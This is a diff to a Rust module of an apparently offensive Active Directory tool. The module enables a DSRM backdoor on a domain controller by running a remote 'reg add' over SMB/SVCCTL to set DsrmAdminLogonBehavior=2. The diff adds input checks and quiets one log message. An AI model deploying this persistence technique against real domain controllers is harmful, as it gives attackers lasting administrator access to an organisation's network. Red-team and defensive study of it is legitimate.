@@ -24,7 +24,7 @@
 
 use overthrone_core::error::{OverthroneError, Result};
 use overthrone_core::proto::smb::SmbSession;
-use tracing::{info, warn};
+use tracing::{debug, info, warn};
 
 use crate::exec_util;
 use crate::runner::{ForgeConfig, ForgeResult, PersistenceResult};
@@ -34,11 +34,27 @@ const DSRM_REG_PATH: &str = r"HKLM\System\CurrentControlSet\Control\Lsa";
 const DSRM_REG_VALUE: &str = "DsrmAdminLogonBehavior";
 
 /// Enable DSRM backdoor on the target DC.
-///
 /// Connects via SMB, verifies admin access, then executes the `reg add` command
 /// remotely via SVCCTL to set `DsrmAdminLogonBehavior=2`.
 pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[dsrm] Enabling DSRM backdoor on {}", config.dc_ip);
+
+    // ── Input validation ────────────────────────────────────────
+    if config.dc_ip.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "DC IP address cannot be empty for DSRM backdoor".into(),
+        ));
+    }
+    if config.domain.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "Domain cannot be empty for DSRM backdoor".into(),
+        ));
+    }
+    if config.username.trim().is_empty() {
+        return Err(OverthroneError::TicketForge(
+            "Username cannot be empty for DSRM backdoor".into(),
+        ));
+    }
 
     // ── Validate credentials ────────────────────────────────────
     let (use_password, password_or_hash) = match (&config.password, &config.nt_hash) {
@@ -129,7 +145,7 @@ pub async fn enable_dsrm_backdoor(config: &ForgeConfig) -> Result<ForgeResult> {
     let verify_output = exec_util::run_remote_command(&smb, &verify_cmd)
         .await
         .unwrap_or_else(|e| {
-            warn!("[dsrm] Verification query failed: {e}");
+            debug!("[dsrm] Verification query failed: {e}");
             String::new()
         });
 
